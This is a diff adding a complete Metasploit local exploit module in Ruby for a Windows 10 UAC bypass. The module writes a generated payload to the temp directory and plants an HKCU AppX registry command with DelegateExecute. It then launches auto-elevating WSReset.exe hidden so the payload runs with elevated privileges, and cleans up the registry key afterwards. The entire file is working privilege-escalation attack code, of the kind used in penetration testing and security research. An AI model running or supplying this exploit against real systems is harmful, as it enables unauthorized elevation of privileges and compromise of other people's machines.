@@ -1,0 +1,156 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ManualRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+  include Post::Windows::Priv
+  include Post::Windows::Runas
+
+  def initialize(info = {})
+    super(
+      update_info(info,
+        'Name'          => 'Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry',
+        'Description'   => %q(
+        This module exploits a flaw in the WSReset.exe file associated with the Windows
+        Store.  This binary has autoelevate privs, and it will run a binary file
+        contained in a low-privilege registry location.  By placing a link to
+        the binary in the registry location, WSReset.exe will launch the binary as
+        a privileged user.
+        ),
+        'License'       => MSF_LICENSE,
+        'Author'        => [
+          'ACTIVELabs',   # discovery
+          'sailay1996',   # poc
+          'bwatters-r7',  # metasploit module
+        ],
+        'Platform'      => ['win'],
+        'SessionTypes'  => ['meterpreter'],
+        'Targets'       => [[ 'Automatic', {} ]],
+        'DefaultTarget' => 0,
+        'DefaultOptions' => {
+          'WfsDelay'     => 15
+        },
+        'DisclosureDate'  => 'Feb 19 2019',
+        'Notes'           =>
+        {
+          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ]
+        },
+        'References'    => [
+          ['URL', 'https://www.activecyber.us/activelabs/windows-uac-bypass'],
+          ['URL', 'https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html'],
+          ['URL', 'https://github.com/sailay1996/UAC_bypass_windows_store'],
+        ]
+      )
+    )
+    register_options(
+      [OptString.new('PAYLOAD_NAME', [false, 'The filename to use for the payload binary (%RAND% by default).', nil])]
+    )
+
+  end
+
+  def check
+    if sysinfo['OS'] =~ /Windows 10/ && is_uac_enabled? && exists?("C:\\Windows\\System32\\WSReset.exe")
+      return CheckCode::Appears
+    end
+
+    CheckCode::Safe
+  end
+
+  def exploit
+    check_permissions!
+    case get_uac_level
+    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
+      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
+      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
+      fail_with(Failure::NotVulnerable,
+                "UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...")
+    when UAC_DEFAULT
+      print_good('UAC is set to Default')
+      print_good('BypassUAC can bypass this setting, continuing...')
+    when UAC_NO_PROMPT
+      print_warning('UAC set to DoNotPrompt - using ShellExecute "runas" method instead')
+      shell_execute_exe
+      return
+    end
+
+    # get directory locations straight
+    win_dir = session.sys.config.getenv('windir')
+    vprint_status("win_dir = " + win_dir)
+    tmp_dir = session.sys.config.getenv('tmp')
+    vprint_status("tmp_dir = " + tmp_dir)
+    exploit_dir = win_dir + "\\System32\\"
+    vprint_status("exploit_dir = " + exploit_dir)
+    reset_filepath = exploit_dir + "WSReset.exe"
+    vprint_status("exploit_file = " + reset_filepath)
+
+    # make payload
+    payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6)) + '.exe'
+    payload_pathname = tmp_dir + '\\' + payload_name
+    vprint_status("payload_pathname = " + payload_pathname)
+    vprint_status("Making Payload")
+    payload = generate_payload_exe
+    reg_command = exploit_dir + "cmd.exe /c start #{payload_pathname}"
+    vprint_status("reg_command = " + reg_command)
+    registry_key = "HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
+
+
+    # make registry changes
+    vprint_status("Making Registry Changes")
+    begin
+      registry_createkey(registry_key)
+      registry_setvaldata(registry_key, "DelegateExecute", '', "REG_SZ")
+      registry_setvaldata(registry_key, '', reg_command, "REG_SZ")
+    rescue ::Exception => e
+      print_error(e.to_s)
+    end
+    vprint_status("Registry Changes Complete")
+    # Upload payload
+    vprint_status("Uploading Payload to #{payload_pathname}")
+    write_file(payload_pathname, payload)
+    vprint_status("Payload Upload Complete")
+
+    vprint_status("Launching " + reset_filepath)
+    begin
+      session.sys.process.execute("cmd.exe /c \"#{reset_filepath}\"", nil, 'Hidden' => true)
+    rescue ::Exception => e
+      print_error(e.to_s)
+    end
+    print_warning("This exploit requires manual cleanup of '#{payload_pathname}!")
+    # wait for a few seconds before cleaning up
+    sleep(20)
+    vprint_status("Removing Registry Changes")
+    registry_deletekey(registry_key)
+    vprint_status("Registry Changes Removed")
+  end
+
+  def check_permissions!
+    unless check == Exploit::CheckCode::Appears
+      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
+    end
+    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?
+    # Check if you are an admin
+    # is_in_admin_group can be nil, true, or false
+    print_status('UAC is Enabled, checking level...')
+    vprint_status('Checking admin status...')
+    admin_group = is_in_admin_group?
+    if admin_group.nil?
+      print_error('Either whoami is not there or failed to execute')
+      print_error('Continuing under assumption you already checked...')
+    else
+      if admin_group
+        print_good('Part of Administrators group! Continuing...')
+      else
+        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
+      end
+    end
+
+    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
+      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
+    end
+  end
+end
